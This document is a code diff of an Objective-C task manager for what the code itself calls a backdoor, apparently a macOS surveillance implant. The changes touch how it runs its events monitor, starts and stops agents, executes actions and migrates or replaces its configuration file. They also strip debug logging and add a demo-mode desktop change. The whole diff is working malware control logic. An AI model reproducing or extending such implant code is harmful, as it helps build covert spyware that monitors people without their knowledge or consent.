@@ -49,9 +49,9 @@ static NSLock *gSyncLock                  = nil;
 
 @implementation RCSMTaskManager
 
-//@synthesize mEventsList;
-//@synthesize mActionsList;
-//@synthesize mAgentsList;
+@synthesize mEventsList;
+@synthesize mActionsList;
+@synthesize mAgentsList;
 @synthesize mBackdoorID;
 @synthesize mBackdoorControlFlag;
 @synthesize mShouldReloadConfiguration;
@@ -123,26 +123,8 @@ static NSLock *gSyncLock                  = nil;
                                 [[[NSBundle mainBundle] executablePath] lastPathComponent]];
               
               mActions = [[RCSMActions alloc] init];
-              
-//              key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
-//              key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
-//              
-//              gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
-//                                                                      size: gMemCommandMaxSize
-//                                                             semaphoreName: SHMEM_SEM_NAME];
-              
-//              [gSharedMemoryCommand createMemoryRegion];
-//              [gSharedMemoryCommand attachToMemoryRegion];
-//              
-//              gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
-//                                                                      size: gMemLogMaxSize
-//                                                             semaphoreName: SHMEM_SEM_NAME];
-//              [gSharedMemoryLogging createMemoryRegion];
-//              [gSharedMemoryLogging attachToMemoryRegion];
-              
               gTaskManagerLock  = [[NSLock alloc] init];
               mIsSyncing        = NO;
-              
               sharedTaskManager = self;
             }
         }
@@ -194,11 +176,11 @@ static NSLock *gSyncLock                  = nil;
       //
       // Start events monitoring
       //
-      //[self eventsMonitor];
+      [self eventsMonitor];
       
-      [NSThread detachNewThreadSelector: @selector(eventsMonitor)
-                               toTarget: self
-                             withObject: nil];
+//      [NSThread detachNewThreadSelector: @selector(eventsMonitor)
+//                               toTarget: self
+//                             withObject: nil];
       
     }
   else
@@ -214,12 +196,41 @@ static NSLock *gSyncLock                  = nil;
   return TRUE;
 }
 
+// FIXED-
+- (BOOL)shouldMigrateConfiguration: (NSString*)migrationConfiguration
+{ 
+  if ([[NSFileManager defaultManager] fileExistsAtPath: migrationConfiguration] == TRUE)
+    {
+      NSLog(@"ok migrate");
+      if ([mConfigManager checkConfigurationIntegrity: migrationConfiguration])
+        {   
+          NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
+                                         [[NSBundle mainBundle] bundlePath],
+                                         gConfigurationName];
+           NSLog(@"gConfigurationName %@", gConfigurationName);                              
+          if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
+                                                         error: nil])
+            {
+               NSLog(@"gConfigurationName removed");
+              if ([[NSFileManager defaultManager] moveItemAtPath: migrationConfiguration
+                                                          toPath: configurationPath
+                                                           error: nil])
+                {
+                  NSLog(@"migrationConfiguration %@ to gConfigurationName %@", migrationConfiguration, gConfigurationName);
+                  [configurationPath release];
+                  return TRUE;
+                }
+            }
+            
+          [configurationPath release];
+        }
+    }
+  
+  return FALSE;
+}
+
 - (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
 {
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Writing new configuration");
-#endif
-  
   NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
                                  [[NSBundle mainBundle] bundlePath],
                                  gConfigurationName];
@@ -238,15 +249,9 @@ static NSLock *gSyncLock                  = nil;
                        atomically: YES];
   
   if ([mConfigManager checkConfigurationIntegrity: configurationUpdatePath])
-    {
-#ifdef DEBUG_TASK_MANAGER
-      infoLog(@"checkConfigurationIntegrity went ok");
-#endif
-      
-      //
+    {   
       // If we're here it means that the file is ok thus it is safe to replace
       // the original one
-      //
       if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
                                                      error: nil])
         {
@@ -262,18 +267,10 @@ static NSLock *gSyncLock                  = nil;
               return TRUE;
             }
         }
-      else
-        {
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Error while removing config name");
-#endif
-        }
     }
   else
     {
-      //
       // In case of errors remove the temp file
-      //
       [[NSFileManager defaultManager] removeItemAtPath: configurationUpdatePath
                                                  error: nil];
 
@@ -631,7 +628,11 @@ static NSLock *gSyncLock                  = nil;
   verboseLog(@"exit critical session [euid/uid %d/%d]", 
              geteuid(), getuid());
 #endif
-
+  
+  // FIXED-
+  if (gIsDemoMode == YES)
+    changeDesktopBg(nil, YES);
+    
   exit(0);
 }
 
@@ -3256,30 +3257,19 @@ static NSLock *gSyncLock                  = nil;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Triggering action no. %d", anActionID);
-#endif
-  
   BOOL _isSyncing = NO;
   int waitCounter = 0;
+  NSMutableDictionary *configuration;
   
   NSArray *configArray = [self getConfigForAction: anActionID];
-  NSMutableDictionary *configuration;
     
   if (configArray == nil)
-    {
-#ifdef DEBUG_TASK_MANAGER
-      infoLog(@"Action not found");
-#endif
-      
+    {   
+      // FIXED-
       [outerPool release];
       return FALSE;
     }
 
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"configArray: %@", configArray);
-#endif
-  
   for (configuration in configArray)
     {
       u_int actionType = [[configuration objectForKey: @"type"] intValue];
@@ -3359,18 +3349,7 @@ static NSLock *gSyncLock                  = nil;
               {
                 NSNumber *status = [NSNumber numberWithInt: 1];
                 [configuration setObject: status forKey: @"status"];
-                //[configuration threadSafeSetObject: status
-                //                            forKey: @"status"
-                //                         usingLock: gTaskManagerLock];
-
                 [mActions actionAgent: configuration start: TRUE];
-              }
-            else
-              {
-#ifdef DEBUG_TASK_MANAGER
-                errorLog(@"Can't start agent with status: %d",
-                         [[configuration objectForKey: @"status"] intValue]);
-#endif
               }
             break;
           }
@@ -3379,20 +3358,14 @@ static NSLock *gSyncLock                  = nil;
             if ([[configuration objectForKey: @"status"] intValue] == 0)
               {
                 NSNumber *status = [NSNumber numberWithInt: 1];
-                //[configuration setObject: status forKey: @"status"];
+                
                 [configuration threadSafeSetObject: status
                                             forKey: @"status"
                                          usingLock: gTaskManagerLock];
 
                 [mActions actionAgent: configuration start: FALSE];
               }
-            else
-              {
-#ifdef DEBUG_TASK_MANAGER
-                errorLog(@"Can't stop agent with status: %d",
-                         [[configuration objectForKey: @"status"] intValue]);
-#endif
-              }
+
             break;
           }
         case ACTION_EXECUTE:
@@ -3400,7 +3373,7 @@ static NSLock *gSyncLock                  = nil;
             if ([[configuration objectForKey: @"status"] intValue] == 0)
               {
                 NSNumber *status = [NSNumber numberWithInt: 1];
-                //[configuration setObject: status forKey: @"status"];
+                
                 [configuration threadSafeSetObject: status
                                             forKey: @"status"
                                          usingLock: gTaskManagerLock];
@@ -3415,7 +3388,7 @@ static NSLock *gSyncLock                  = nil;
             if ([[configuration objectForKey: @"status"] intValue] == 0)
               {
                 NSNumber *status = [NSNumber numberWithInt: 1];
-                //[configuration setObject: status forKey: @"status"];
+               
                 [configuration threadSafeSetObject: status
                                             forKey: @"status"
                                          usingLock: gTaskManagerLock];
@@ -3438,6 +3411,20 @@ static NSLock *gSyncLock                  = nil;
               }
 
             break;
+          }
+        case ACTION_EVENT:
+          {
+          if ([[configuration objectForKey: @"status"] intValue] == 0)
+            {
+              NSNumber *status = [NSNumber numberWithInt: 1];
+              [configuration setObject: status forKey: @"status"];
+            
+              [mActions actionEvent: configuration];
+              status = [NSNumber numberWithInt: 0];
+              [configuration setObject: status forKey: @"status"];
+            }
+          
+          break;
           }
         default:
           {
@@ -3630,23 +3617,20 @@ static NSLock *gSyncLock                  = nil;
 
 - (NSArray *)getConfigForAction: (u_int)anActionID
 {
-  NSMutableArray *configArray = [[NSMutableArray alloc] init];
-  NSMutableDictionary *anObject;
-
-  for (anObject in mActionsList)
-    {
-      if ([[anObject threadSafeObjectForKey: @"actionID"
-                                  usingLock: gTaskManagerLock]
-           unsignedIntValue] == anActionID)
-        {
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Action %d found", anActionID);
-#endif
-          [configArray addObject: anObject];
-        }
-    }
+#define ACTION_SUBACT_KEY @"subactions"  
   
-  return [configArray autorelease];
+  if (anActionID == 0xFFFFFFFF)
+    return nil;
+  
+  NSArray *subactions;
+    
+  @synchronized(self)
+  {
+    NSDictionary *subaction = [mActionsList objectAtIndex:anActionID];
+    subactions = [[[subaction objectForKey: ACTION_SUBACT_KEY] retain] autorelease];
+  }
+  
+  return subactions;
 }
 
 - (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
